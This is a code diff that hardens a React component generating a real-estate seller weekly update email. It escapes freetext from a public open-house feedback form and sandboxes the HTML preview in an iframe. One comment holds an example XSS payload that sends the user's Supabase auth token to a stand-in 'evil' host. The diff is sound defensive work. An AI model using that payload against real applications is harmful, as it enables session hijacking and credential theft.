@@ -1,5 +1,6 @@
 import { useState, useMemo } from 'react'
 import { Button } from './ui/index.jsx'
+import { escHtml } from '../lib/html.js'
 
 /**
  * Generates a seller weekly update email auto-populated from this listing's
@@ -123,49 +124,63 @@ export default function SellerWeeklyUpdate({ listing, listingOHs = [], ohSignIns
     const priceStr = listPrice ? `$${Number(listPrice).toLocaleString()}` : 'Price TBD'
     const domStr = stats.dom != null ? `${stats.dom} Day${stats.dom !== 1 ? 's' : ''} on Market` : 'Just listed'
 
+    // `liked` and `concerns` are public-form freetext (OH feedback). Escape
+    // before letting them anywhere near the HTML template. `showingLine`,
+    // `signInLine`, `ohLine` are app-computed strings but escape anyway for
+    // defense in depth — date parsing can splice DB content in.
     const activityBullets = [
-      showingLine && `<li><strong>Private Showings:</strong> ${showingLine}</li>`,
-      `<li><strong>Open House:</strong> ${ohLine}</li>`,
-      signInLine && `<li><strong>Sign-Ins:</strong> ${signInLine}</li>`,
-      feedbackSummary && `<li><strong>Buyer Feedback:</strong> ${feedbackSummary}</li>`,
-      liked && `<li><strong>What Buyers Liked:</strong> ${liked}</li>`,
-      concerns && `<li><strong>Common Concerns:</strong> ${concerns}</li>`,
+      showingLine && `<li><strong>Private Showings:</strong> ${escHtml(showingLine)}</li>`,
+      `<li><strong>Open House:</strong> ${escHtml(ohLine)}</li>`,
+      signInLine && `<li><strong>Sign-Ins:</strong> ${escHtml(signInLine)}</li>`,
+      feedbackSummary && `<li><strong>Buyer Feedback:</strong> ${escHtml(feedbackSummary)}</li>`,
+      liked && `<li><strong>What Buyers Liked:</strong> ${escHtml(liked)}</li>`,
+      concerns && `<li><strong>Common Concerns:</strong> ${escHtml(concerns)}</li>`,
     ].filter(Boolean).join('\n      ')
 
     // Hosting-agent feedback block (toggled by Insert OH Feedback button)
     const PRICE = { too_high: 'too high', fair: 'about right', great_deal: 'great deal' }
     const INTEREST = { high: 'high', medium: 'medium', low: 'low', none: 'none' }
     const SHOWAGAIN = { yes: 'Yes', maybe: 'Maybe', no: 'No' }
+    // Every `f.*` field below is freetext from the public OH feedback form.
+    // Escape on the way out — without this, a malicious comment like
+    // `<img src=x onerror=fetch('https://evil/'+localStorage.getItem('sb-...-auth-token'))>`
+    // would fire inside Dana's authenticated session.
     const hostFeedbackHtml = (includeHostFeedback && hostingAgentFeedback.length > 0)
       ? `<div style="background:#F6F4EE;border:1px solid #C8C3B9;border-radius:8px;padding:16px;margin:16px 0;">
     <h3 style="font-family:'Georgia',serif;font-size:16px;font-weight:400;margin:0 0 10px;">Hosting Agent Feedback</h3>
     ${hostingAgentFeedback.map(f => {
-      const host = f.hosting_agent_name || 'Hosting agent'
+      const host = escHtml(f.hosting_agent_name || 'Hosting agent')
       const ohDate = f.open_house?.date ? new Date(f.open_house.date + 'T12:00:00').toLocaleDateString('en-US', { month: 'short', day: 'numeric' }) : ''
       const lines = []
-      if (f.buyer_count != null) lines.push(`<li>${f.buyer_count} buyer${f.buyer_count !== 1 ? 's' : ''} attended</li>`)
-      if (f.buyer_interest_level) lines.push(`<li>Interest: ${INTEREST[f.buyer_interest_level] || f.buyer_interest_level}</li>`)
-      if (f.price_feedback) lines.push(`<li>Price feels ${PRICE[f.price_feedback] || f.price_feedback}</li>`)
-      if (f.would_show_again) lines.push(`<li>Would show buyers again: ${SHOWAGAIN[f.would_show_again] || f.would_show_again}</li>`)
-      if (f.overall_impression) lines.push(`<li><em>Overall:</em> ${f.overall_impression}</li>`)
-      if (f.liked) lines.push(`<li><em>Liked:</em> ${f.liked}</li>`)
-      if (f.concerns) lines.push(`<li><em>Concerns:</em> ${f.concerns}</li>`)
-      if (f.general_comments) lines.push(`<li><em>Notes:</em> ${f.general_comments}</li>`)
-      return `<div style="margin:8px 0 12px;"><div style="font-size:13px;color:#8b7a68;margin-bottom:4px;">${host}${ohDate ? ' · ' + ohDate : ''}</div><ul style="margin:0;padding-left:20px;font-size:14px;color:#5A4136;line-height:1.6;">${lines.join('')}</ul></div>`
+      if (f.buyer_count != null) lines.push(`<li>${escHtml(f.buyer_count)} buyer${f.buyer_count !== 1 ? 's' : ''} attended</li>`)
+      if (f.buyer_interest_level) lines.push(`<li>Interest: ${escHtml(INTEREST[f.buyer_interest_level] || f.buyer_interest_level)}</li>`)
+      if (f.price_feedback) lines.push(`<li>Price feels ${escHtml(PRICE[f.price_feedback] || f.price_feedback)}</li>`)
+      if (f.would_show_again) lines.push(`<li>Would show buyers again: ${escHtml(SHOWAGAIN[f.would_show_again] || f.would_show_again)}</li>`)
+      if (f.overall_impression) lines.push(`<li><em>Overall:</em> ${escHtml(f.overall_impression)}</li>`)
+      if (f.liked) lines.push(`<li><em>Liked:</em> ${escHtml(f.liked)}</li>`)
+      if (f.concerns) lines.push(`<li><em>Concerns:</em> ${escHtml(f.concerns)}</li>`)
+      if (f.general_comments) lines.push(`<li><em>Notes:</em> ${escHtml(f.general_comments)}</li>`)
+      return `<div style="margin:8px 0 12px;"><div style="font-size:13px;color:#8b7a68;margin-bottom:4px;">${host}${ohDate ? ' · ' + escHtml(ohDate) : ''}</div><ul style="margin:0;padding-left:20px;font-size:14px;color:#5A4136;line-height:1.6;">${lines.join('')}</ul></div>`
     }).join('')}
   </div>`
       : ''
+
+    const addrSafe = escHtml(listing.address || 'Your Property')
+    const citySafe = escHtml(listing.city || '')
+    const priceSafe = escHtml(priceStr)
+    const domSafe = escHtml(domStr)
+    const dateRangeSafe = escHtml(dateRange)
 
     return `
 <div style="font-family: 'Nunito Sans', Arial, sans-serif; max-width: 600px; margin: 0 auto; color: #3A2A1E;">
   <div style="padding: 24px 0; border-bottom: 1px solid #C8C3B9;">
     <h1 style="font-family: 'Georgia', serif; font-size: 28px; font-weight: 400; margin: 0;">Weekly Listing Update</h1>
-    <p style="color: #5A4136; margin: 4px 0 0; font-size: 14px;">${dateRange}</p>
+    <p style="color: #5A4136; margin: 4px 0 0; font-size: 14px;">${dateRangeSafe}</p>
   </div>
 
   <div style="padding: 20px 0;">
-    <h2 style="font-family: 'Georgia', serif; font-size: 20px; font-weight: 400; margin: 0 0 12px;">${listing.address || 'Your Property'}</h2>
-    <p style="color: #5A4136; font-size: 14px; margin: 0;">${listing.city || ''}${listing.city ? ', AZ' : ''} · ${priceStr} · ${domStr}</p>
+    <h2 style="font-family: 'Georgia', serif; font-size: 20px; font-weight: 400; margin: 0 0 12px;">${addrSafe}</h2>
+    <p style="color: #5A4136; font-size: 14px; margin: 0;">${citySafe}${listing.city ? ', AZ' : ''} · ${priceSafe} · ${domSafe}</p>
   </div>
 
   <div style="background: #F6F4EE; border: 1px solid #C8C3B9; border-radius: 8px; padding: 16px; margin: 16px 0;">
@@ -180,14 +195,14 @@ export default function SellerWeeklyUpdate({ listing, listingOHs = [], ohSignIns
   ${editable.marketContext.trim() ? `
   <div style="padding: 16px 0; border-bottom: 1px solid #C8C3B9;">
     <h3 style="font-family: 'Georgia', serif; font-size: 16px; font-weight: 400; margin: 0 0 8px;">Market Context</h3>
-    <p style="color: #5A4136; font-size: 14px; line-height: 1.6;">${editable.marketContext}</p>
+    <p style="color: #5A4136; font-size: 14px; line-height: 1.6;">${escHtml(editable.marketContext).replace(/\n/g, '<br/>')}</p>
   </div>
   ` : ''}
 
   ${editable.nextSteps.trim() ? `
   <div style="padding: 16px 0;">
     <h3 style="font-family: 'Georgia', serif; font-size: 16px; font-weight: 400; margin: 0 0 8px;">Next Steps</h3>
-    <p style="color: #5A4136; font-size: 14px; line-height: 1.6;">${editable.nextSteps}</p>
+    <p style="color: #5A4136; font-size: 14px; line-height: 1.6;">${escHtml(editable.nextSteps).replace(/\n/g, '<br/>')}</p>
   </div>
   ` : ''}
 
@@ -265,9 +280,16 @@ export default function SellerWeeklyUpdate({ listing, listingOHs = [], ohSignIns
         </div>
       )}
 
-      {/* Preview */}
+      {/* Preview — sandboxed iframe: even if an escape is missed upstream,
+          a script inside updateHtml can't reach the parent's origin or its
+          localStorage (where the Supabase session JWT lives). */}
       <div style={{ padding: 16, maxHeight: 400, overflowY: 'auto' }}>
-        <div dangerouslySetInnerHTML={{ __html: updateHtml }} />
+        <iframe
+          title="Weekly seller update preview"
+          sandbox=""
+          srcDoc={updateHtml}
+          style={{ width: '100%', minHeight: 320, border: 0, background: '#fff' }}
+        />
       </div>
     </div>
   )
